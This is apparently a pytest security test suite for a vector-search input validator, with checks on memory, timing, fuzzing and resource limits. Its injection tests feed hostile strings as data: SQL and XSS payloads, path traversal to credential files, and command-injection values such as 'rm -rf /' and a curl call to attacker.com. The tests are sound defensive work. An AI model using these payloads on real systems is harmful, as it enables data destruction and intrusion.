#!/usr/bin/env python3
"""
Penetration testing suite for vector security vulnerabilities.

This module simulates realistic attack scenarios against vector validation
systems to ensure robustness against sophisticated attacks.

Attack scenarios tested:
- Memory exhaustion attacks
- Resource consumption attacks
- Input fuzzing and malformed data
- Timing-based attacks
- Gradient descent poisoning simulations
- Adversarial vector generation
"""

import contextlib
import gc
import math
import resource
import sys
import time
from concurrent.futures import ThreadPoolExecutor
from typing import Any

import numpy as np
import pytest
from hypothesis import given, settings, strategies as st

from src.models.vector_search import (
    DimensionError,
    SearchStage,
    SecureVectorModel,
)


class TestVectorPenetrationAttacks:
    """Penetration testing for vector security vulnerabilities."""

    @pytest.fixture
    def attack_vectors(self) -> dict[str, list[Any]]:
        """Generate various attack vector payloads."""
        return {
            # Memory exhaustion attacks
            "memory_bomb": [1.0] * 100000,
            "gradual_increase": [1.0] * 4500,  # Just above limit
            # Type confusion attacks
            "mixed_types": [1.0, "2.0", 3, None, {"key": "value"}],
            "nested_structures": [[1.0, 2.0], [3.0, 4.0]],
            "unicode_injection": ["1.0\u0000", "2.0\uffff"],
            # Numeric edge cases
            "extreme_values": [1e308, -1e308, 1e-308, -1e-308],
            "special_floats": [float("nan"), float("inf"), float("-inf")],
            "subnormal_numbers": [2.2250738585072014e-308],
            # Injection attempts
            "sql_injection": ["'; DROP TABLE vectors; --"],
            "xss_injection": ["<script>alert('xss')</script>"],
            "path_traversal": ["../../../etc/passwd"],
            "null_injection": ["\x00\x00\x00\x00"],
            # Binary data
            "binary_data": [b"\x00\x01\x02\x03"],
            "emoji_unicode": ["🚀💥⚡"],
        }

    def test_memory_exhaustion_attack(
        self, attack_vectors: dict[str, list[Any]]
    ) -> None:
        """Test resistance to memory exhaustion attacks."""
        memory_bomb = attack_vectors["memory_bomb"]

        # Measure memory before attack
        gc.collect()
        memory_before = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss

        with pytest.raises(
            (ValueError, DimensionError), match=r"security: DoS prevention"
        ):
            SearchStage(
                stage_name="memory-bomb-test",
                query_vector=SecureVectorModel(values=memory_bomb),
            )

        # Ensure memory wasn't consumed
        gc.collect()
        memory_after = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
        memory_increase = memory_after - memory_before

        # Allow for some variance but shouldn't increase significantly
        assert memory_increase < 50000, (
            f"Memory increased too much: {memory_increase} KB"
        )

    def test_gradual_attack_escalation(self) -> None:
        """Test resistance to gradual escalation attacks."""
        base_size = 4000
        increment = 100
        max_attempts = 20

        for attempt in range(max_attempts):
            vector_size = base_size + (attempt * increment)
            test_vector = [1.0] * vector_size

            if vector_size <= 4096:
                # Should succeed
                stage = SearchStage(
                    stage_name=f"test-{attempt}",
                    query_vector=SecureVectorModel(values=test_vector),
                )
                assert len(stage.query_vector.values) == vector_size
            else:
                # Should fail consistently
                with pytest.raises(
                    (ValueError, DimensionError), match=r"security: DoS prevention"
                ):
                    SearchStage(
                        stage_name=f"test-{attempt}",
                        query_vector=SecureVectorModel(values=test_vector),
                    )

    def test_concurrent_attack_simulation(self) -> None:
        """Test system behavior under concurrent attack scenarios."""

        def attack_function(attack_id: int) -> tuple[int, str, bool]:
            """Execute attack and return results."""
            try:
                # Vary attack vectors by thread
                if attack_id % 3 == 0:
                    # Memory attack
                    vector = [1.0] * 10000
                elif attack_id % 3 == 1:
                    # Type confusion attack
                    vector = [1.0, "malicious", float("nan")]
                else:
                    # Normal vector (should succeed)
                    vector = [1.0, 2.0, 3.0]

                SearchStage(
                    stage_name=f"attack-{attack_id}",
                    query_vector=SecureVectorModel(values=vector),
                )
            except (ValueError, DimensionError) as e:
                return (attack_id, str(e), "security:" in str(e))
            except (ConnectionError, TimeoutError, RuntimeError) as e:
                return (attack_id, str(e), False)
            else:
                return (attack_id, "success", True)

        # Launch concurrent attacks
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(attack_function, i) for i in range(60)]
            results = [future.result() for future in futures]

        # Analyze results
        successes = [r for r in results if r[2] is True and r[1] == "success"]
        security_blocks = [r for r in results if r[2] is True and "security:" in r[1]]
        failures = [r for r in results if r[2] is False]

        # Should have roughly 1/3 successes, 2/3 security blocks, 0 failures
        assert len(successes) >= 15, f"Too few successes: {len(successes)}"
        assert len(security_blocks) >= 30, (
            f"Too few security blocks: {len(security_blocks)}"
        )
        assert len(failures) == 0, f"Unexpected failures: {failures}"

    def test_timing_attack_resistance(self) -> None:
        """Test that validation timing doesn't leak information."""
        test_cases = [
            ([1.0] * 100, "small_valid"),
            ([1.0] * 4096, "large_valid"),
            ([1.0] * 5000, "invalid_size"),
            ([float("nan")] * 100, "invalid_content"),
            (["string"] * 100, "invalid_type"),
        ]

        timing_results = {}

        for vector, case_name in test_cases:
            times = []
            for _ in range(100):  # Multiple runs for statistical significance
                start = time.perf_counter()
                with contextlib.suppress(ValueError, TypeError):
                    SearchStage(
                        stage_name=f"timing-test-{case_name}",
                        query_vector=SecureVectorModel(values=vector),
                    )
                end = time.perf_counter()
                times.append((end - start) * 1000)  # Convert to ms

            timing_results[case_name] = {
                "mean": np.mean(times),
                "std": np.std(times),
                "min": min(times),
                "max": max(times),
            }

        # Validation timing should be consistent regardless of rejection reason
        invalid_cases = ["invalid_size", "invalid_content", "invalid_type"]
        timings = [timing_results[case]["mean"] for case in invalid_cases]

        # All invalid cases should have similar timing (within 2x)
        max_timing = max(timings)
        min_timing = min(timings)
        timing_ratio = max_timing / min_timing if min_timing > 0 else float("inf")

        assert timing_ratio < 3.0, f"Timing variance too high: {timing_ratio:.2f}x"

    @pytest.mark.parametrize(
        "attack_type",
        [
            "buffer_overflow_sim",
            "format_string_sim",
            "integer_overflow_sim",
        ],
    )
    def test_attack_pattern_simulation(self, attack_type: str) -> None:
        """Test resistance to various attack pattern simulations."""
        if attack_type == "buffer_overflow_sim":
            # Simulate buffer overflow with extremely long vector
            attack_vector = [1.0] * 1000000
        elif attack_type == "format_string_sim":
            # Simulate format string attack with special characters
            attack_vector = ["%s%s%s%s", "%x%x%x%x", "%.1000d"]
        elif attack_type == "integer_overflow_sim":
            # Simulate integer overflow with max values
            attack_vector = [sys.maxsize, -sys.maxsize, 2**63]

        with pytest.raises((ValueError, TypeError)) as exc_info:
            SearchStage(
                stage_name=f"attack-{attack_type}",
                query_vector=SecureVectorModel(values=attack_vector),
            )

        # Ensure we get a proper security error, not a crash
        error_msg = str(exc_info.value)
        assert "security:" in error_msg or len(error_msg) > 0

    def test_adversarial_vector_generation(self) -> None:
        """Test resistance to adversarial vectors designed to bypass validation."""
        # Generate vectors that are "almost" valid but designed to cause issues
        adversarial_cases = [
            # Vector with values just at the edge of float precision
            [1.7976931348623157e307] * 100,  # Close to overflow
            # Vector with subnormal numbers
            [2.2250738585072014e-308] * 100,
            # Vector with alternating extreme values
            [1e308 if i % 2 == 0 else -1e308 for i in range(100)],
            # Vector with incrementally increasing invalid values
            [float("inf") + i for i in range(100)],
            # Vector designed to test edge cases in dimension checking
            [1.0] * 4096 + [1.0],  # Exactly one over limit
        ]

        for i, adversarial_vector in enumerate(adversarial_cases):
            with pytest.raises((ValueError, TypeError, OverflowError)) as exc_info:
                SearchStage(
                    stage_name=f"adversarial-{i}",
                    query_vector=SecureVectorModel(values=adversarial_vector),
                )

            # Ensure proper error handling
            error_msg = str(exc_info.value)
            assert len(error_msg) > 0, f"Empty error message for case {i}"


class TestVectorFuzzingAttacks:
    """Fuzzing-based penetration testing."""

    @given(
        st.lists(
            st.one_of(
                st.floats(allow_nan=True, allow_infinity=True),
                st.integers(),
                st.text(),
                st.binary(),
                st.none(),
                st.booleans(),
                st.dictionaries(st.text(), st.text()),
                st.lists(st.floats()),
            ),
            min_size=0,
            max_size=10000,
        )
    )
    @settings(max_examples=500, deadline=None)
    def test_comprehensive_fuzz_testing(self, fuzz_vector: list[Any]) -> None:
        """Comprehensive fuzzing test with arbitrary input data."""
        try:
            stage = SearchStage(
                stage_name="fuzz-test",
                query_vector=SecureVectorModel(values=fuzz_vector),
            )

            # If it succeeds, verify the result is sane
            assert isinstance(stage.query_vector.values, list)
            assert len(stage.query_vector.values) > 0
            assert len(stage.query_vector.values) <= 4096
            assert all(isinstance(v, int | float) for v in stage.query_vector.values)
            assert all(math.isfinite(v) for v in stage.query_vector.values)

        except (ValueError, TypeError) as e:
            # Expected for invalid inputs - ensure error is handled properly
            error_msg = str(e)
            assert len(error_msg) > 0
            # Should not crash or raise unexpected exceptions
        except (ConnectionError, TimeoutError, RuntimeError) as e:
            # Unexpected exceptions indicate a problem
            pytest.fail(f"Unexpected exception with input {fuzz_vector[:5]}...: {e}")

    @given(st.lists(st.floats(), min_size=4097, max_size=20000))
    @settings(max_examples=100)
    def test_oversized_vector_fuzzing(self, oversized_vector: list[float]) -> None:
        """Fuzz test specifically for oversized vectors."""
        with pytest.raises(
            (ValueError, DimensionError), match=r"security: DoS prevention"
        ):
            SearchStage(
                stage_name="oversized-fuzz",
                query_vector=SecureVectorModel(values=oversized_vector),
            )

    def test_malformed_input_combinations(self) -> None:
        """Test combinations of malformed inputs."""
        malformed_combinations = [
            # Mix of valid and invalid at different positions
            ([1.0] * 100) + [float("nan")] + ([2.0] * 100),
            ([float("inf")] + [1.0] * 4095),
            ([1.0] * 4095 + [float("-inf")]),
            # Type mixing at boundaries
            [1.0] * 50 + ["string"] + [2.0] * 50,
            [1] * 100 + [1.0] * 100,  # Mix int and float
            # Special float combinations
            [0.0, -0.0, 1.0, -1.0, float("nan"), float("inf")],
        ]

        for i, malformed_vector in enumerate(malformed_combinations):
            with pytest.raises((ValueError, TypeError)):
                SearchStage(
                    stage_name=f"malformed-{i}",
                    query_vector=SecureVectorModel(values=malformed_vector),
                )


class TestVectorInjectionAttacks:
    """Test resistance to various injection attack patterns."""

    def test_sql_injection_resistance(self) -> None:
        """Test that SQL injection patterns are properly rejected."""
        sql_injection_patterns = [
            "'; DROP TABLE vectors; --",
            "1' OR '1'='1",
            "'; DELETE FROM embeddings; --",
            "UNION SELECT * FROM users",
            "1'; INSERT INTO logs VALUES ('hacked'); --",
        ]

        for injection_pattern in sql_injection_patterns:
            with pytest.raises(ValueError, match=r"could not convert string to float"):
                SearchStage(
                    stage_name="sql-injection-test",
                    query_vector=SecureVectorModel(
                        values=[1.0, injection_pattern, 3.0]
                    ),
                )

    def test_xss_injection_resistance(self) -> None:
        """Test that XSS patterns are properly rejected."""
        xss_patterns = [
            "<script>alert('xss')</script>",
            "javascript:alert(1)",
            "<img src=x onerror=alert(1)>",
            "';!--\"<XSS>=&{()}",
        ]

        for xss_pattern in xss_patterns:
            with pytest.raises(ValueError, match=r"could not convert string to float"):
                SearchStage(
                    stage_name="xss-injection-test",
                    query_vector=SecureVectorModel(values=[1.0, xss_pattern, 3.0]),
                )

    def test_path_traversal_resistance(self) -> None:
        """Test that path traversal patterns are properly rejected."""
        path_traversal_patterns = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
            "....//....//....//",
        ]

        for traversal_pattern in path_traversal_patterns:
            with pytest.raises(ValueError, match=r"could not convert string to float"):
                SearchStage(
                    stage_name="path-traversal-test",
                    query_vector=SecureVectorModel(
                        values=[1.0, traversal_pattern, 3.0]
                    ),
                )

    def test_command_injection_resistance(self) -> None:
        """Test that command injection patterns are properly rejected."""
        command_injection_patterns = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& curl attacker.com",
            "`whoami`",
            "$(id)",
        ]

        for command_pattern in command_injection_patterns:
            with pytest.raises(ValueError, match=r"could not convert string to float"):
                SearchStage(
                    stage_name="command-injection-test",
                    query_vector=SecureVectorModel(values=[1.0, command_pattern, 3.0]),
                )

    def test_unicode_injection_resistance(self) -> None:
        """Test that Unicode injection patterns are properly rejected."""
        unicode_patterns = [
            "\u0000",  # Null byte
            "\uffff",  # Unicode max
            "\u202e",  # Right-to-left override
            "\u2028",  # Line separator
            "\u0085",  # Next line
        ]

        for unicode_pattern in unicode_patterns:
            with pytest.raises(
                ValueError,
                match=r"Invalid vector value.*could not convert string to float",
            ):
                SearchStage(
                    stage_name="unicode-injection-test",
                    query_vector=SecureVectorModel(values=[1.0, unicode_pattern, 3.0]),
                )


@pytest.mark.slow
class TestVectorResourceExhaustion:
    """Test resistance to resource exhaustion attacks."""

    def test_cpu_exhaustion_resistance(self) -> None:
        """Test that validation doesn't consume excessive CPU."""
        large_valid_vector = [1.0] * 4096
        iterations = 1000

        start_time = time.perf_counter()
        for i in range(iterations):
            SearchStage(
                stage_name=f"cpu-test-{i}",
                query_vector=SecureVectorModel(values=large_valid_vector),
            )
        end_time = time.perf_counter()

        total_time = end_time - start_time
        avg_time_ms = (total_time / iterations) * 1000

        # Should be fast even for large valid vectors
        assert avg_time_ms < 5.0, f"Validation too slow: {avg_time_ms:.3f}ms per vector"

    def test_memory_leak_resistance(self) -> None:
        """Test that repeated validation doesn't leak memory."""

        # Force garbage collection
        gc.collect()
        initial_memory = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss

        # Perform many validations
        for i in range(1000):
            try:
                # Mix valid and invalid vectors
                if i % 2 == 0:
                    vector = [1.0] * 1000
                    SearchStage(
                        stage_name=f"mem-test-{i}",
                        query_vector=SecureVectorModel(values=vector),
                    )
                else:
                    vector = [1.0] * 10000  # Invalid size
                    with pytest.raises((ValueError, DimensionError)):
                        SearchStage(
                            stage_name=f"mem-test-{i}",
                            query_vector=SecureVectorModel(values=vector),
                        )
            except (ValueError, ConnectionError, TimeoutError, RuntimeError):
                pass  # Expected for invalid cases

            # Periodic garbage collection
            if i % 100 == 0:
                gc.collect()

        # Final garbage collection
        gc.collect()
        final_memory = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
        memory_increase = final_memory - initial_memory

        # Memory increase should be minimal
        assert memory_increase < 100000, (
            f"Memory leak detected: {memory_increase} KB increase"
        )


if __name__ == "__main__":
    # Run penetration tests
    pytest.main([__file__, "-v", "--tb=short", "-m", "not slow"])
